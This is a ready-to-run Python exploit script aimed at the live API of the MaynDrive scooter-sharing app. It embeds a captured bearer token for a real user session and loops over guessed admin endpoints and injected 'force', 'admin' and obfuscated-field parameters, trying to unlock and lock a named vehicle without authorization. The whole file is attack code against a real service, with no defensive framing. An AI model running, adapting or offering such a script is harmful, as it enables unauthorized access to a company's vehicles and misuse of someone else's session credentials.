#!/usr/bin/env python3
"""
Exploit Code Analysis Vulnerabilities
Based on deep analysis of MaynDrive app code structure and obfuscated classes
"""

import requests
import json
import time
import threading
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# Fresh token from capture
FRESH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI3NmM0NzE3ZS03ZWM5LTRkN2MtOWRlOS00NjRiNjJlY2VhYzgiLCJpYXQiOjE3NTk0NTQ3NjQsImV4cCI6MTc1OTQ1ODM2NH0.ivnhjjDy1zEtAD1BTJAAK5V1vDtAaSHNuHZWpMspSFE"

def exploit_coroutine_class_vulnerabilities():
    """Exploit vulnerabilities based on discovered coroutine classes"""
    print("=" * 80)
    print("[EXPLOIT] COROUTINE CLASS VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Exploit different coroutine classes for privilege escalation")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Based on code analysis, we found multiple coroutine classes:
    # B4.Y4 (standard unlock), B4.W4 (admin/force unlock), B4.M4 (standard lock), B4.U4 (temporary lock)
    
    # Test admin/force unlock coroutine (B4.W4)
    print("\n[EXPLOIT] Admin/Force Unlock Coroutine (B4.W4)")
    print("   Testing admin unlock with force parameter...")
    
    admin_force_payloads = [
        {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522,
            "force": True,
            "admin": True
        },
        {
            "serial_number": "SXB306", 
            "lat": 48.8566,
            "lng": 2.3522,
            "force": True,
            "scope": "admin"
        },
        {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522,
            "force": True,
            "coroutine_type": "B4.W4"
        }
    ]
    
    admin_endpoints = [
        "/api/application/vehicles/unlock",
        "/api/application/vehicles/unlock/admin",
        "/api/admin/vehicles/unlock",
        "/api/application/admin/vehicles/unlock"
    ]
    
    admin_success = False
    
    for endpoint in admin_endpoints:
        for i, payload in enumerate(admin_force_payloads, 1):
            print(f"   [TEST {i}] Endpoint: {endpoint}")
            print(f"     Payload: {json.dumps(payload, indent=2)}")
            
            try:
                response = requests.post(
                    f"{BASE_URL}{endpoint}",
                    headers=headers,
                    json=payload,
                    timeout=15
                )
                
                print(f"     Status: {response.status_code}")
                print(f"     Response: {response.text}")
                
                if response.status_code == 200:
                    print(f"     [SUCCESS] Admin/Force unlock successful!")
                    admin_success = True
                    break
                elif response.status_code == 401:
                    print(f"     [ERROR] Token expired/invalid")
                    return False
                elif response.status_code == 403:
                    print(f"     [BLOCKED] Permission denied")
                    continue
                else:
                    print(f"     [INFO] Status: {response.status_code}")
                    continue
                    
            except Exception as e:
                print(f"     [ERROR] Request failed: {e}")
                continue
        
        if admin_success:
            break
    
    # Test temporary lock coroutine (B4.U4)
    print("\n[EXPLOIT] Temporary Lock Coroutine (B4.U4)")
    print("   Testing temporary/freefloat lock with different parameters...")
    
    temp_lock_payloads = [
        {
            "vehicle_id": "SXB306",
            "temporary": True,
            "force": True
        },
        {
            "vehicle_id": "SXB306",
            "temporary": True,
            "admin": True
        },
        {
            "pass_id": "qb.q@9243539",
            "vehicle_id": "SXB306", 
            "temporary": True,
            "coroutine_type": "B4.U4"
        }
    ]
    
    temp_lock_endpoints = [
        "/api/application/vehicles/freefloat/lock",
        "/api/application/vehicles/freefloat/lock/temporary",
        "/api/application/vehicles/lock/temporary",
        "/api/admin/vehicles/freefloat/lock"
    ]
    
    temp_lock_success = False
    
    for endpoint in temp_lock_endpoints:
        for i, payload in enumerate(temp_lock_payloads, 1):
            print(f"   [TEST {i}] Endpoint: {endpoint}")
            print(f"     Payload: {json.dumps(payload, indent=2)}")
            
            try:
                response = requests.post(
                    f"{BASE_URL}{endpoint}",
                    headers=headers,
                    json=payload,
                    timeout=15
                )
                
                print(f"     Status: {response.status_code}")
                print(f"     Response: {response.text}")
                
                if response.status_code == 200:
                    print(f"     [SUCCESS] Temporary lock successful!")
                    temp_lock_success = True
                    break
                elif response.status_code == 401:
                    print(f"     [ERROR] Token expired/invalid")
                    return False
                elif response.status_code == 403:
                    print(f"     [BLOCKED] Permission denied")
                    continue
                else:
                    print(f"     [INFO] Status: {response.status_code}")
                    continue
                    
            except Exception as e:
                print(f"     [ERROR] Request failed: {e}")
                continue
        
        if temp_lock_success:
            break
    
    return {
        "admin_force_unlock": admin_success,
        "temporary_lock": temp_lock_success
    }

def exploit_obfuscated_field_vulnerabilities():
    """Exploit vulnerabilities based on obfuscated field names"""
    print("\n" + "=" * 80)
    print("[EXPLOIT] OBFUSCATED FIELD VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Exploit field name obfuscation for parameter injection")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Based on code analysis, we found obfuscated field names like:
    # f2925Z (token), f2927g0 (serial), f2928h0 (location), f2882i0 (force)
    
    print("\n[EXPLOIT] Obfuscated Field Name Injection")
    print("   Testing injection of obfuscated field names...")
    
    obfuscated_payloads = [
        {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522,
            "f2925Z": "Bearer " + FRESH_TOKEN.split(" ")[1],  # Token field
            "f2927g0": "SXB306",  # Serial field
            "f2928h0": {"lat": 48.8566, "lng": 2.3522},  # Location field
            "f2882i0": True  # Force field
        },
        {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522,
            "f2661Z": "Bearer " + FRESH_TOKEN.split(" ")[1],  # Lock token field
            "f2663g0": 12345,  # Pass/Vehicle ID field
            "f2664h0": True  # Temporary field
        },
        {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522,
            "f2836Z": "Bearer " + FRESH_TOKEN.split(" ")[1],  # Temp lock token
            "f2838g0": "SXB306",  # Vehicle ID field
            "f2839h0": True  # Temporary field
        }
    ]
    
    obfuscated_endpoints = [
        "/api/application/vehicles/unlock",
        "/api/application/vehicles/freefloat/lock",
        "/api/application/vehicles/unlock/admin"
    ]
    
    obfuscated_success = False
    
    for endpoint in obfuscated_endpoints:
        for i, payload in enumerate(obfuscated_payloads, 1):
            print(f"   [TEST {i}] Endpoint: {endpoint}")
            print(f"     Payload: {json.dumps(payload, indent=2)}")
            
            try:
                response = requests.post(
                    f"{BASE_URL}{endpoint}",
                    headers=headers,
                    json=payload,
                    timeout=15
                )
                
                print(f"     Status: {response.status_code}")
                print(f"     Response: {response.text}")
                
                if response.status_code == 200:
                    print(f"     [SUCCESS] Obfuscated field injection successful!")
                    obfuscated_success = True
                    break
                elif response.status_code == 401:
                    print(f"     [ERROR] Token expired/invalid")
                    return False
                elif response.status_code == 403:
                    print(f"     [BLOCKED] Permission denied")
                    continue
                else:
                    print(f"     [INFO] Status: {response.status_code}")
                    continue
                    
            except Exception as e:
                print(f"     [ERROR] Request failed: {e}")
                continue
        
        if obfuscated_success:
            break
    
    return obfuscated_success

def exploit_interface_method_vulnerabilities():
    """Exploit vulnerabilities based on interface method analysis"""
    print("\n" + "=" * 80)
    print("[EXPLOIT] INTERFACE METHOD VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Exploit T3.I interface methods for unauthorized access")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Based on code analysis, we found T3.I interface with methods:
    # n() for unlock, e() for lock
    
    print("\n[EXPLOIT] Interface Method Parameter Manipulation")
    print("   Testing different parameter combinations for T3.I methods...")
    
    # Test method n() (unlock) with different parameters
    method_n_payloads = [
        {
            "serial": "SXB306",
            "latitude": 48.856614,
            "longitude": 2.352222,
            "method": "n"
        },
        {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522,
            "method": "n",
            "force": True
        },
        {
            "serial": "SXB306",
            "latitude": 48.856614,
            "longitude": 2.352222,
            "method": "n",
            "admin": True
        }
    ]
    
    # Test method e() (lock) with different parameters
    method_e_payloads = [
        {
            "vehicleId": "SXB306",
            "force": False,
            "method": "e"
        },
        {
            "vehicleId": "SXB306",
            "force": True,
            "method": "e",
            "admin": True
        },
        {
            "vehicleId": "SXB306",
            "force": True,
            "method": "e",
            "temporary": True
        }
    ]
    
    interface_success = False
    
    # Test method n() endpoints
    for payload in method_n_payloads:
        print(f"   [METHOD N] Testing unlock method with payload:")
        print(f"     {json.dumps(payload, indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"     Status: {response.status_code}")
            print(f"     Response: {response.text}")
            
            if response.status_code == 200:
                print(f"     [SUCCESS] Method n() exploit successful!")
                interface_success = True
                break
            elif response.status_code == 401:
                print(f"     [ERROR] Token expired/invalid")
                return False
            elif response.status_code == 403:
                print(f"     [BLOCKED] Permission denied")
                continue
            else:
                print(f"     [INFO] Status: {response.status_code}")
                continue
                
        except Exception as e:
            print(f"     [ERROR] Request failed: {e}")
            continue
    
    # Test method e() endpoints
    for payload in method_e_payloads:
        print(f"   [METHOD E] Testing lock method with payload:")
        print(f"     {json.dumps(payload, indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/freefloat/lock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"     Status: {response.status_code}")
            print(f"     Response: {response.text}")
            
            if response.status_code == 200:
                print(f"     [SUCCESS] Method e() exploit successful!")
                interface_success = True
                break
            elif response.status_code == 401:
                print(f"     [ERROR] Token expired/invalid")
                return False
            elif response.status_code == 403:
                print(f"     [BLOCKED] Permission denied")
                continue
            else:
                print(f"     [INFO] Status: {response.status_code}")
                continue
                
        except Exception as e:
            print(f"     [ERROR] Request failed: {e}")
            continue
    
    return interface_success

def exploit_repository_class_vulnerabilities():
    """Exploit vulnerabilities based on repository class analysis"""
    print("\n" + "=" * 80)
    print("[EXPLOIT] REPOSITORY CLASS VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Exploit C4887q repository class methods")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Based on code analysis, we found C4887q repository with methods:
    # a() for activate (unlock), p() for deactivate (lock)
    
    print("\n[EXPLOIT] Repository Method Exploitation")
    print("   Testing repository methods a() and p()...")
    
    # Test repository method a() (activate/unlock)
    repo_a_payloads = [
        {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522,
            "repository_method": "a",
            "action": "activate"
        },
        {
            "serial": "SXB306",
            "latitude": 48.856614,
            "longitude": 2.352222,
            "repository_method": "a",
            "action": "activate",
            "force": True
        }
    ]
    
    # Test repository method p() (deactivate/lock)
    repo_p_payloads = [
        {
            "vehicle_id": "SXB306",
            "repository_method": "p",
            "action": "deactivate"
        },
        {
            "vehicleId": "SXB306",
            "force": False,
            "repository_method": "p",
            "action": "deactivate"
        }
    ]
    
    repository_success = False
    
    # Test method a() (activate/unlock)
    for payload in repo_a_payloads:
        print(f"   [REPO METHOD A] Testing activate method:")
        print(f"     {json.dumps(payload, indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"     Status: {response.status_code}")
            print(f"     Response: {response.text}")
            
            if response.status_code == 200:
                print(f"     [SUCCESS] Repository method a() exploit successful!")
                repository_success = True
                break
            elif response.status_code == 401:
                print(f"     [ERROR] Token expired/invalid")
                return False
            elif response.status_code == 403:
                print(f"     [BLOCKED] Permission denied")
                continue
            else:
                print(f"     [INFO] Status: {response.status_code}")
                continue
                
        except Exception as e:
            print(f"     [ERROR] Request failed: {e}")
            continue
    
    # Test method p() (deactivate/lock)
    for payload in repo_p_payloads:
        print(f"   [REPO METHOD P] Testing deactivate method:")
        print(f"     {json.dumps(payload, indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/freefloat/lock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"     Status: {response.status_code}")
            print(f"     Response: {response.text}")
            
            if response.status_code == 200:
                print(f"     [SUCCESS] Repository method p() exploit successful!")
                repository_success = True
                break
            elif response.status_code == 401:
                print(f"     [ERROR] Token expired/invalid")
                return False
            elif response.status_code == 403:
                print(f"     [BLOCKED] Permission denied")
                continue
            else:
                print(f"     [INFO] Status: {response.status_code}")
                continue
                
        except Exception as e:
            print(f"     [ERROR] Request failed: {e}")
            continue
    
    return repository_success

def exploit_token_storage_vulnerabilities():
    """Exploit vulnerabilities based on token storage analysis"""
    print("\n" + "=" * 80)
    print("[EXPLOIT] TOKEN STORAGE VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Exploit P3.D token storage class vulnerabilities")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Based on code analysis, we found P3.D token storage with method b()
    
    print("\n[EXPLOIT] Token Storage Method Exploitation")
    print("   Testing token storage method b() vulnerabilities...")
    
    # Test different token formats and storage methods
    token_storage_payloads = [
        {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522,
            "token_storage_method": "b",
            "token_format": "Bearer"
        },
        {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522,
            "token_storage_method": "b",
            "token_format": "Bearer",
            "force_refresh": True
        },
        {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522,
            "P3_D_method": "b",
            "token_retrieval": "automatic"
        }
    ]
    
    token_storage_success = False
    
    for payload in token_storage_payloads:
        print(f"   [TOKEN STORAGE] Testing token storage method:")
        print(f"     {json.dumps(payload, indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"     Status: {response.status_code}")
            print(f"     Response: {response.text}")
            
            if response.status_code == 200:
                print(f"     [SUCCESS] Token storage method exploit successful!")
                token_storage_success = True
                break
            elif response.status_code == 401:
                print(f"     [ERROR] Token expired/invalid")
                return False
            elif response.status_code == 403:
                print(f"     [BLOCKED] Permission denied")
                continue
            else:
                print(f"     [INFO] Status: {response.status_code}")
                continue
                
        except Exception as e:
            print(f"     [ERROR] Request failed: {e}")
            continue
    
    return token_storage_success

def main():
    print("=" * 80)
    print("[EXPLOIT] CODE ANALYSIS VULNERABILITIES EXPLOITATION")
    print("=" * 80)
    print("[WARNING] Exploiting vulnerabilities discovered through code analysis!")
    print("=" * 80)
    
    # Exploit all code analysis vulnerabilities
    coroutine_results = exploit_coroutine_class_vulnerabilities()
    obfuscated_results = exploit_obfuscated_field_vulnerabilities()
    interface_results = exploit_interface_method_vulnerabilities()
    repository_results = exploit_repository_class_vulnerabilities()
    token_storage_results = exploit_token_storage_vulnerabilities()
    
    # Summary
    print("\n" + "=" * 80)
    print("[RESULTS] CODE ANALYSIS VULNERABILITIES EXPLOITATION SUMMARY")
    print("=" * 80)
    
    print(f"\n[COROUTINE CLASS EXPLOITATION] Results:")
    if isinstance(coroutine_results, dict) and (coroutine_results.get("admin_force_unlock") or coroutine_results.get("temporary_lock")):
        print(f"   [CRITICAL] Coroutine class exploits successful!")
        print(f"     Admin/Force unlock: {coroutine_results.get('admin_force_unlock', False)}")
        print(f"     Temporary lock: {coroutine_results.get('temporary_lock', False)}")
    else:
        print(f"   [OK] No coroutine class exploits successful")
    
    print(f"\n[OBFUSCATED FIELD EXPLOITATION] Results:")
    if obfuscated_results:
        print(f"   [CRITICAL] Obfuscated field injection successful!")
    else:
        print(f"   [OK] Obfuscated field injection blocked")
    
    print(f"\n[INTERFACE METHOD EXPLOITATION] Results:")
    if interface_results:
        print(f"   [CRITICAL] Interface method exploits successful!")
    else:
        print(f"   [OK] Interface method exploits blocked")
    
    print(f"\n[REPOSITORY CLASS EXPLOITATION] Results:")
    if repository_results:
        print(f"   [CRITICAL] Repository class exploits successful!")
    else:
        print(f"   [OK] Repository class exploits blocked")
    
    print(f"\n[TOKEN STORAGE EXPLOITATION] Results:")
    if token_storage_results:
        print(f"   [CRITICAL] Token storage exploits successful!")
    else:
        print(f"   [OK] Token storage exploits blocked")
    
    # Overall assessment
    coroutine_count = 0
    if isinstance(coroutine_results, dict):
        coroutine_count = sum(coroutine_results.values())
    elif isinstance(coroutine_results, bool):
        coroutine_count = 1 if coroutine_results else 0
    
    total_exploits = (coroutine_count + 
                     (1 if obfuscated_results else 0) +
                     (1 if interface_results else 0) +
                     (1 if repository_results else 0) +
                     (1 if token_storage_results else 0))
    
    print(f"\n[OVERALL ASSESSMENT]")
    print(f"   Total successful exploits: {total_exploits}")
    
    if total_exploits > 0:
        print(f"   [CRITICAL] Code analysis vulnerabilities successfully exploited!")
        print(f"   [WARNING] MaynDrive app has additional code-level security issues!")
    else:
        print(f"   [OK] No code analysis vulnerabilities could be exploited")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
